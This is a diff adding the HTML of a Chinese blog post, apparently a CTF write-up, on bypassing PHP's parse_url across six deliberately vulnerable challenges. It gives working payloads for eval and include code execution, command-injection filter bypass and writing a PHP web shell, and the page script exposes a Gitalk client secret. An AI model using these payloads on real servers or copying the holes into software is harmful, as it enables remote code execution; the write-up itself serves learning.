@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>PARSE_URL绕过挑战 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="parse_url函数介绍
+源码
+challenge1
+&lt;?php
+
+$data = parse_url($_GET['u']);
+
+eval($data['host']);
+
+?u=//eval($_GET[1]);/ff&amp;..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">PARSE_URL绕过挑战</h2>
+            <div class="post-date">2024-08-17</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/parse_url-rao-guo.png')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <p><a href="https://php.golaravel.com/function.parse-url.html">parse_url函数介绍</a><br>
+<a href="https://github.com/php/php-src/blob/8db3d36f2fc7bc440d3a0697a2ce04dca5e73ad1/ext/standard/url.c">源码</a></p>
+<h2 id="challenge1">challenge1</h2>
+<pre><code class="language-php">&lt;?php
+
+$data = parse_url($_GET['u']);
+
+eval($data['host']);
+</code></pre>
+<pre><code>?u=//eval($_GET[1]);/ff&amp;1=system(%27cat%20/flag_is_here.txt%27);
+</code></pre>
+<h2 id="challenge2">challenge2</h2>
+<pre><code class="language-php">&lt;?php
+
+$data = parse_url($_GET['u']);
+
+include $data['host'].$data['path'];
+</code></pre>
+<pre><code>POST /?u=//php:://input HTTP/1.1
+
+data:/text/plain,&lt;?php system('cat /_f1ag_1s_h3re.txt');?&gt;
+</code></pre>
+<h2 id="challenge3">challenge3</h2>
+<pre><code class="language-php">&lt;?php
+
+$data = parse_url($_GET['u']);
+
+include $data['scheme'].$data['path'];
+</code></pre>
+<pre><code>POST /?u=php:://input HTTP/1.1
+
+data:/text/plain,&lt;?php system('cat /_f1a_g_1s_h3re');?&gt;
+</code></pre>
+<p>附带一篇<a href="https://www.cnblogs.com/hf99/p/9637354.html">parse_url源码解析</a>的文章</p>
+<h2 id="challenge4">challenge4</h2>
+<pre><code class="language-php">&lt;?php
+
+$data = parse_url($_GET['u']);
+
+system($data['host']);
+</code></pre>
+<p>host参数里不能有<code>/</code>，需要用其他方法绕过，参考<a href="https://xz.aliyun.com/t/13829">命令注入限制绕过思路刨析</a></p>
+<p>使用<code>${HOME:0:1}</code>来构造<code>/</code></p>
+<pre><code>?u=//cat%20${HOME:0:1}1_f1ag_1s_h3re:1
+</code></pre>
+<h2 id="challenge5">challenge5</h2>
+<pre><code class="language-php">&lt;?php
+
+extract(parse_url($_GET['u']));
+include $$$$$$host;
+</code></pre>
+<p>extract会覆盖变量，然后我们多设置一些变量，让它经过五次跳转到我们控制的内容。</p>
+<pre><code>user://pass:query@scheme/1.html/?fragment#php://input&quot;
+</code></pre>
+<p>parse_url解析结果</p>
+<pre><code>Array
+(
+    [scheme] =&gt; user
+    [host] =&gt; scheme
+    [user] =&gt; pass
+    [pass] =&gt; query
+    [path] =&gt; /1.html/
+    [query] =&gt; fragment
+    [fragment] =&gt; php://input
+)
+</code></pre>
+<p>payload</p>
+<pre><code>POST /?u=user://pass:query@scheme/1.html/?fragment%23php://input HTTP/1.1
+
+&lt;?php system('cat /_f1ag_1s_h3ree');?&gt;
+</code></pre>
+<h2 id="challenge6">challenge6</h2>
+<pre><code class="language-php">&lt;?php
+
+$data = parse_url($_GET['u']);
+
+file_put_contents($data['path'], $data['host']);
+</code></pre>
+<p>host里不能有<code>?</code>，所以不能写入一般的php代码</p>
+<p>使用<code>&lt;script language='php'&gt;</code>格式来绕过。</p>
+<pre><code>//&lt;script%20language=%27php%27&gt;eval($_GET[1]);/var/www/html/2.php
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowzu-jian-lou-dong/">
+                  <h3 class="post-title">
+                    [ctfshow]组件漏洞
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
